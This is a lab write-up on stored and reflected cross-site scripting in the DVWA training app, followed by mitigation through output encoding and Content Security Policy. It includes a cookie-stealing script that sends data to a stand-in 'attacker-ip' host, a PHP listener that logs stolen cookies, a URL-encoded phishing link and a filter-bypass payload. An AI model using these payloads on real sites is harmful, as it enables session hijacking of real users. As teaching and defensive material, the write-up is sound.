# Cross-Site Scripting (XSS) — DVWA

Second vulnerability in this task. XSS is one of those bugs that sounds simple ("inject some JavaScript") but actually comes in a few different flavors depending on *where* the malicious script ends up living. Tested both Stored and Reflected variants on DVWA at Low security, then looked at what actually stops them.

## What XSS actually is

Cross-Site Scripting happens when an application takes user input and puts it into a page's HTML output without properly sanitizing or encoding it first. If the input isn't neutralized, a browser can't tell the difference between "text the user typed" and "a script the site meant to run" — so it just executes it.

The core issue is the same as SQL Injection in spirit: **untrusted input is being treated as code instead of data.** With SQLi that's a database query; with XSS it's HTML/JavaScript running inside someone else's browser.

There are three main types:

| Type | Where the payload lives | Who gets hit |
|---|---|---|
| Stored (Persistent) | Saved in the database/server, served to every visitor | Anyone who views the affected page |
| Reflected (Non-persistent) | Bounced straight back in the response, usually from a URL parameter | Only the person who clicks the crafted link |
| DOM-based | Never touches the server — JavaScript on the page itself unsafely handles user input | Whoever loads the page with the malicious input |

This note covers Stored and Reflected, both on DVWA.

---

## 1. Stored XSS

### Where it was tested
DVWA → **XSS (Stored)** page — a simple guestbook form with a "Name" and "Message" field that saves entries to the database and displays them to every visitor.

### Payload
```html
<script>alert('Stored XSS')</script>
```
Entered into the Message box and submitted.

### What happens
The message gets saved to the database exactly as typed, with no encoding. Every time the guestbook page loads afterward — for any visitor, not just the one who submitted it — the browser parses that stored text as part of the page's HTML, hits the `<script>` tag, and runs it. The alert box pops up on every single page load from then on, for every user.

### A more realistic payload (cookie theft)
An `alert()` box is just there to prove the concept works. A real attacker would do something like:

```html
<script>
document.location='http://attacker-ip/steal.php?cookie=' + document.cookie
</script>
```

Paired with a simple listener on the attacker's side:

```php
<?php
// steal.php on attacker's server
$cookie = $_GET['cookie'];
file_put_contents('stolen.txt', $cookie . "\n", FILE_APPEND);
?>
```

Anyone who views the guestbook has their session cookie silently sent to the attacker's server, which can then be used to hijack their logged-in session without ever needing their password.

### Why Stored XSS is the more dangerous variant
It doesn't need to be delivered — it just sits there and waits. No tricking someone into clicking a link; they just have to visit a page that already has the payload baked into it.

---

## 2. Reflected XSS

### Where it was tested
DVWA → **XSS (Reflected)** page — takes a `name` parameter from the URL and echoes it back on the page ("Hello, [name]").

### Payload (via URL query parameter)
```
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>
```

### What happens
The server takes whatever's in the `name` parameter and drops it straight into the page's HTML output without encoding it. Since the payload is never saved anywhere, it only fires for whoever actually loads that specific URL — which is why this type is almost always delivered through phishing links, since the attacker needs the victim to click it.

### Realistic delivery
A crafted link sent over email/chat, often with the payload URL-encoded to look less obviously suspicious:
```
http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker-ip%2Fsteal.php%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

---

## 3. Mitigation

### Input validation
The general rule: never trust anything coming from the client, and validate it against what it's actually supposed to be. If a "name" field should only ever contain letters, reject anything with `<`, `>`, `"`, `'`, or script-like patterns before it's stored or reflected back.

That said, blacklisting characters or keywords is fragile — attackers get around filters constantly with encoding tricks, case variation, or alternate tags (`<img onerror=...>` instead of `<script>`). The actual fix that matters is output encoding.

### Output encoding — the real fix
Whenever user input is going to be displayed back inside HTML, it needs to be encoded so the browser treats it as literal text, not as markup.

**Vulnerable PHP (what DVWA Low does):**
```php
echo 'Hello, ' . $_GET['name'];
```

**Fixed:**
```php
echo 'Hello, ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` converts the dangerous characters into their HTML entity equivalents:

| Character | Encoded as |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

So `<script>alert(1)</script>` gets rendered on the page as the literal text `<script>alert(1)</script>` instead of being executed — the browser sees text, not a tag.

This same idea applies in every language/framework, just with different function names:
- PHP: `htmlspecialchars()`
- JavaScript (React/DOM): avoid `dangerouslySetInnerHTML` / `innerHTML`; use `textContent` or let the framework's default escaping handle it
- Python (Flask/Jinja2): auto-escaping is on by default — avoid `| safe` unless the content is fully trusted

### Content Security Policy (CSP)
A second layer of defense that doesn't rely on catching every possible injection point — instead it restricts what the browser is *allowed* to execute in the first place, via an HTTP response header.

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

- `default-src 'self'` — only load resources (scripts, images, styles, etc.) from the site's own origin by default.
- `script-src 'self'` — only execute JavaScript that comes from the site's own domain, not inline `<script>` tags or scripts from random third-party sources.

Even if an attacker manages to sneak a `<script>` tag into the page somehow, a properly configured CSP will block the browser from executing it, because inline scripts aren't in the allowed source list. It's not a replacement for fixing the actual injection point, but it's a strong safety net if something slips through.

To apply this in Apache: enable the headers module and add the line above to the site config or `.htaccess`:
```bash
sudo a2enmod headers
sudo systemctl restart apache2
```

---

## 4. Confirming the fix

Set DVWA to **Medium** or **High** security and repeat both payloads:

- Medium level typically strips `<script>` tags with a basic filter — bypassable with alternate payloads like `<img src=x onerror=alert(1)>`, which is a good demonstration of why blacklisting alone isn't reliable.
- High level applies `htmlspecialchars()`-style encoding — the payload shows up as plain visible text on the page (`<script>alert('Stored XSS')</script>` literally printed out) instead of executing.

That visible difference — script running vs. script printed as harmless text — is the actual proof the fix works.

---

## Key Takeaways

- Stored XSS is more dangerous than Reflected because it doesn't need a victim to click anything — it just sits on the page waiting.
- Reflected XSS relies on tricking someone into clicking a crafted link, usually via phishing.
- Blacklisting dangerous keywords/characters is not a real fix — it's almost always bypassable.
- The actual fix is output encoding (`htmlspecialchars()` or equivalent) at the point where user input gets displayed, combined with a Content Security Policy as a second layer of defense.
